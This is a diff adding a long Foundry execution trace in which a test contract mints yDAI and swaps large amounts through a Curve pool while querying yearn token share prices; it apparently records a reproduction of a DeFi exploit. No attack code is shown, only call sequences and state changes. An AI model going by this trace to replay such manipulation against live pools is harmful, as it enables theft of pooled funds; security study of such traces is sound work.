+    │   │   │   │   │   @ 0x6e10ff27cae71a13525bd61167857e5c982b4674c8e654900e4e9d5035811f78: 0x00000000000000000000000000000000000000000000dc39f88ad0d3e0180000 → 0x000000000000000000000000000000000000000000000877dcbc03e63f180000
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [602] DAI::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   └─ ← [Return] 1014696242399124404845345 [1.014e24]
+    │   │   │   ├─ [6496] 0xfC1E690f61EFd961294b3e1Ce3313fBD8aa4f85d::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [staticcall]
+    │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   └─ ← [Return] 442188359110421701547003 [4.421e23]
+    │   │   │   ├─ [15172] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01, 0), 3) [staticcall]
+    │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F], 1304349023930152708453 [1.304e21], 1414550289340267075470830 [1.414e24]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000593b4c
+    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   ├─ [509] 0x493C57C4763932315A328269E1ADaD09653B9081::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [4773] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   ├─ [2257] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::delegateToImplementation(0x70a0823100000000000000000000000016de59092dae5ccf4a1e6439d611fd0653f0bd01) [staticcall]
+    │   │   │   │   │   ├─ [600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 882026620565648890174078 [8.82e23])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 2: 0x000000000000000000000000000000000000000000005555d3baed7254059dc8 → 0x00000000000000000000000000000000000000000001101c9602e095cd563846
+    │   │   │   │   @ 7: 0x0000000000000000000000000000000000000000000060bf025915f5611dd0be → 0x000000000000000000000000000000000000000000013481df5c377efbfd8f1c
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x00000000000000000000000000000000000000000000bac6c247f32379509a7e
+    │   │   │   │   @ 6: 63528 → 63529
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [241332] CurveFiSwap::exchange(0, 1, 50000000000000000000000 [5e22], 0)
+    │   │   │   ├─ [35413] yDAI::getPricePerFullShare() [staticcall]
+    │   │   │   │   ├─ [602] DAI::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1014696242399124404845345 [1.014e24]
+    │   │   │   │   ├─ [6496] 0xfC1E690f61EFd961294b3e1Ce3313fBD8aa4f85d::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [staticcall]
+    │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   │   └─ ← [Return] 442188359110421701547003 [4.421e23]
+    │   │   │   │   ├─ [15172] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01, 0), 3) [staticcall]
+    │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F], 1304349023930152708453 [1.304e21], 1414550289340267075470830 [1.414e24]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000593b4c
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [509] 0x493C57C4763932315A328269E1ADaD09653B9081::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [4773] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   ├─ [2257] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::delegateToImplementation(0x70a0823100000000000000000000000016de59092dae5ccf4a1e6439d611fd0653f0bd01) [staticcall]
+    │   │   │   │   │   │   ├─ [600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 1133752629097174055 [1.133e18]
+    │   │   │   ├─ [31906] yUSDC::getPricePerFullShare() [staticcall]
+    │   │   │   │   ├─ [1315] CentreUSDC::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 40100930833 [4.01e10]
+    │   │   │   │   │   └─ ← [Return] 40100930833 [4.01e10]
+    │   │   │   │   ├─ [6496] 0x9bA00D6856a4eDF4665BcA2C2309936572473B7E::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]) [staticcall]
+    │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003aa3277ba453fdb0c803521
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003aa3277ba453fdb0c803521
+    │   │   │   │   │   └─ ← [Return] 356118867834 [3.561e11]
+    │   │   │   │   ├─ [15172] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0xd6aD7a6750A7593E092a9B218d66C0A814a3436e, 0), 2) [staticcall]
+    │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 2101138810 [2.101e9], 815523096620 [8.155e11]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000f952a0
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [509] 0xF013406A0B1d544238083DF0B93ad0d2cBE0f65f::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [553] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 1259083362487637320 [1.259e18]
+    │   │   │   ├─ [29076] yUSDT::getPricePerFullShare() [staticcall]
+    │   │   │   │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 40817840891 [4.081e10]
+    │   │   │   │   ├─ [803] 0x71fc860F7D3A592A4a98740e39dB31d25db65ae8::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [15130] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x83f798e925BcD4017Eb265844FDDAbb448f1707D, 0), 0) [staticcall]
+    │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804948162090517 [1.38e16], 1820383570136713332186 [1.82e21]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000bbde
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [509] 0xF013406A0B1d544238083DF0B93ad0d2cBE0f65f::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [3780] 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   ├─ [2257] 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9::delegateToImplementation(0x70a0823100000000000000000000000083f798e925bcd4017eb265844fddabb448f1707d) [staticcall]
+    │   │   │   │   │   │   ├─ [600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 7983010 [7.983e6]
+    │   │   │   ├─ [31690] yTUSD::getPricePerFullShare() [staticcall]
+    │   │   │   │   ├─ [1185] 0x0000000000085d4780B73119b644AE5ecd22b376::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   ├─ [486] 0xB650eb28d35691dd1BD481325D40E65273844F9b::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 170968448867038949540386 [1.709e23]
+    │   │   │   │   │   └─ ← [Return] 170968448867038949540386 [1.709e23]
+    │   │   │   │   ├─ [6496] 0x4DA9b813057D04BAef4e5800E36083717b4a0341::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(0x0000000000085d4780B73119b644AE5ecd22b376) [staticcall]
+    │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(0x0000000000085d4780B73119b644AE5ecd22b376) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000004424f1cc34394e959417878
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000004424f1cc34394e959417878
+    │   │   │   │   │   └─ ← [Return] 280671118812599902212786 [2.806e23]
+    │   │   │   │   ├─ [15130] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x73a052500105205d34Daf004eAb301916DA8190f, 0), 0) [staticcall]
+    │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804948162090517 [1.38e16], 1820383570136713332186 [1.82e21]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000bbde
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [509] 0x49f4592E641820e928F9919Ef4aBd92a719B4b49::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [553] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 1239753704121538299 [1.239e18]
+    │   │   │   ├─ [12009] yDAI::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], 50000000000000000000000 [5e22])
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], value: 50000000000000000000000 [5e22])
+    │   │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], value: 115792089237316195423570985008687907853269984665640563989457584007913129639935 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x2b326c195b4bf13398fccd87e6e23fac6ff3d9dc0e93a62080b304ab12378cdd: 0x000000000000000000000000000000000000000000000947eb6fcd63419252c7 → 0x0000000000000000000000000000000000000000000013de6cd3be08bcd252c7
+    │   │   │   │   │   @ 0xd4323eae345c302632428595ef8598a8d956b13b06a6fc8511bc488b90519d29: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffffffffffff5697e9c0f5a84bfffff
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x00000000000000000000000000000000000000000000bac6c247f32379509a7e → 0x00000000000000000000000000000000000000000000b03040e4027dfe109a7e
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [30848] yUSDC::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 41440665000 [4.144e10])
+    │   │   │   │   ├─ emit Transfer(from: CurveFiSwap: [0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 41440665000 [4.144e10])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x00000000000000000000000000000000000000000000000000000009a60e5da8
+    │   │   │   │   │   @ 0x2b326c195b4bf13398fccd87e6e23fac6ff3d9dc0e93a62080b304ab12378cdd: 0x00000000000000000000000000000000000000000000000000000009b63f984f → 0x0000000000000000000000000000000000000000000000000000000010313aa7
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ emit TokenExchange(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 0, param2: 50000000000000000000000 [5e22], param3: 1, param4: 41440665000 [4.144e10])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5acf: 0x00000000000000000000000000000000000000000000000000000009b309d2f1 → 0x000000000000000000000000000000000000000000000000000000000c7cf0cf
+    │   │   │   │   @ 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace: 0x000000000000000000000000000000000000000000000947e9ad1f3a992cd77e → 0x0000000000000000000000000000000000000000000013de6b110fe0146cd77d
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [227812] CurveFiSwap::exchange(0, 3, 160000000000000000000000 [1.6e23], 0)
+    │   │   │   ├─ [35413] yDAI::getPricePerFullShare() [staticcall]
+    │   │   │   │   ├─ [602] DAI::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1014696242399124404845345 [1.014e24]
+    │   │   │   │   ├─ [6496] 0xfC1E690f61EFd961294b3e1Ce3313fBD8aa4f85d::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [staticcall]
+    │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003d17cc8d34193c20d3d3d5d
+    │   │   │   │   │   └─ ← [Return] 442188359110421701547003 [4.421e23]
+    │   │   │   │   ├─ [15172] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01, 0), 3) [staticcall]
+    │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(DAI: [0x6B175474E89094C44Da98b954EedeAC495271d0F], 1304349023930152708453 [1.304e21], 1414550289340267075470830 [1.414e24]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000593b4c
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [509] 0x493C57C4763932315A328269E1ADaD09653B9081::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [4773] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [staticcall]
+    │   │   │   │   │   ├─ [2257] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::delegateToImplementation(0x70a0823100000000000000000000000016de59092dae5ccf4a1e6439d611fd0653f0bd01) [staticcall]
+    │   │   │   │   │   │   ├─ [600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(yDAI: [0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 1133752629097174055 [1.133e18]
+    │   │   │   ├─ [31906] yUSDC::getPricePerFullShare() [staticcall]
+    │   │   │   │   ├─ [1315] CentreUSDC::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   ├─ [529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 40100930833 [4.01e10]
+    │   │   │   │   │   └─ ← [Return] 40100930833 [4.01e10]
+    │   │   │   │   ├─ [6496] 0x9bA00D6856a4eDF4665BcA2C2309936572473B7E::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]) [staticcall]
+    │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003aa3277ba453fdb0c803521
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000003aa3277ba453fdb0c803521
+    │   │   │   │   │   └─ ← [Return] 356118867834 [3.561e11]
+    │   │   │   │   ├─ [15172] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0xd6aD7a6750A7593E092a9B218d66C0A814a3436e, 0), 2) [staticcall]
+    │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(CentreUSDC: [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48], 2101138810 [2.101e9], 815523096620 [8.155e11]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000f952a0
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [509] 0xF013406A0B1d544238083DF0B93ad0d2cBE0f65f::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [553] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::balanceOf(yUSDC: [0xd6aD7a6750A7593E092a9B218d66C0A814a3436e]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 1259083362487637320 [1.259e18]
+    │   │   │   ├─ [29076] yUSDT::getPricePerFullShare() [staticcall]
+    │   │   │   │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 40817840891 [4.081e10]
+    │   │   │   │   ├─ [803] 0x71fc860F7D3A592A4a98740e39dB31d25db65ae8::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [15130] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x83f798e925BcD4017Eb265844FDDAbb448f1707D, 0), 0) [staticcall]
+    │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804948162090517 [1.38e16], 1820383570136713332186 [1.82e21]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000bbde
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [509] 0xF013406A0B1d544238083DF0B93ad0d2cBE0f65f::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [3780] 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [staticcall]
+    │   │   │   │   │   ├─ [2257] 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9::delegateToImplementation(0x70a0823100000000000000000000000083f798e925bcd4017eb265844fddabb448f1707d) [staticcall]
+    │   │   │   │   │   │   ├─ [600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(yUSDT: [0x83f798e925BcD4017Eb265844FDDAbb448f1707D]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 7983010 [7.983e6]
+    │   │   │   ├─ [31690] yTUSD::getPricePerFullShare() [staticcall]
+    │   │   │   │   ├─ [1185] 0x0000000000085d4780B73119b644AE5ecd22b376::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   ├─ [486] 0xB650eb28d35691dd1BD481325D40E65273844F9b::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 170968448867038949540386 [1.709e23]
+    │   │   │   │   │   └─ ← [Return] 170968448867038949540386 [1.709e23]
+    │   │   │   │   ├─ [6496] 0x4DA9b813057D04BAef4e5800E36083717b4a0341::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   ├─ [3312] 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3::getReserveNormalizedIncome(0x0000000000085d4780B73119b644AE5ecd22b376) [staticcall]
+    │   │   │   │   │   │   ├─ [2569] 0x2847A5D7Ce69790cb40471d454FEB21A0bE1F2e3::getReserveNormalizedIncome(0x0000000000085d4780B73119b644AE5ecd22b376) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000004424f1cc34394e959417878
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000004424f1cc34394e959417878
+    │   │   │   │   │   └─ ← [Return] 280671118812599902212786 [2.806e23]
+    │   │   │   │   ├─ [15130] 0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e::getAccountWei((0x73a052500105205d34Daf004eAb301916DA8190f, 0), 0) [staticcall]
+    │   │   │   │   │   ├─ [2111] 0x0eED07cED0C8c36D4a5bfF44F2536422Bb09BE45::getInterestRate(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 13804948162090517 [1.38e16], 1820383570136713332186 [1.82e21]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000bbde
+    │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   ├─ [509] 0x49f4592E641820e928F9919Ef4aBd92a719B4b49::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   ├─ [553] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::balanceOf(yTUSD: [0x73a052500105205d34Daf004eAb301916DA8190f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   └─ ← [Return] 1239753704121538299 [1.239e18]
